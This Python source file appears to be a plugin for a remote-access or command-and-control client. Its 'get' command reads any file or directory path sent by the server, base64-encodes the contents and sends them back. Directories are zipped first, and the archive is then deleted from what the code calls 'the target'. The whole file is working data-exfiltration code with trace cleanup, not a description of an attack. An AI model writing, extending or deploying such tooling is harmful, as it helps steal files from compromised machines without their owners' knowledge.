import os
from os.path import expanduser
from base64 import b64encode
import zipfile, zlib


def zipdir(path, ziph):
    """
    Zip an entire directory.

    :param path:
    :param ziph:
    :return:
    """

    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(path, '..')))


def send_file(filepath, client):
    """
    Send the contents of a file to the server.

    :param filepath:
    :param client:
    :return:
    """

    # Open the given filepath.
    with open(expanduser(filepath), 'rb') as f:
        # Encode the file contents.
        data = b64encode(f.read())
        # Send the data over to the server.
        client.send_data(data, encode=False, terminate=False, echo=False)
        f.close()


class Plugin(object):
    """
    The plugin that handles the `get` command.
    """

    version = 'v1.0'
    # invocation must be set to the command that invokes the plugin.
    invocation = 'get '
    enabled = True

    # The run method must be set on the Plugin object in order to do anything
    def run(self, client, data):
        """
        The run method is called from within the client.py file when needed.

        The `client` argument is the instance of the `Client` object that called the `run` method.
        The `data` argument will be any additional data that was sent along with the command.  It's
        up to the plugin writer to parse the data.

        :param client:
        :param data:
        :return:
        """

        try:
            filepath = data.strip()
            # Try to send the file.
            send_file(filepath, client)

        # Send the error back to the server if the file is not found.
        except FileNotFoundError as err_msg:
            client.send_data(str(err_msg), terminate=False)

        # Handle cases where the file is a directory
        except IsADirectoryError as err_msg:
            # Zip up the directory.
            zip_file = zipfile.ZipFile(expanduser(filepath) + '.zip', 'w', zipfile.ZIP_DEFLATED)
            zipdir(expanduser(filepath), zip_file)
            zip_file.close()

            # Send the zipped folder over to the server.
            send_file(filepath + '.zip', client)
            # Remove the zipped folder from the target.
            os.remove(expanduser(filepath + '.zip'))

        # Send any other error back to the server as well.
        except Exception as err_msg:
            client.send_data(str(err_msg), terminate=False)

        # Send the termination string to the server to let it know the client is done responding.
        client.terminate()

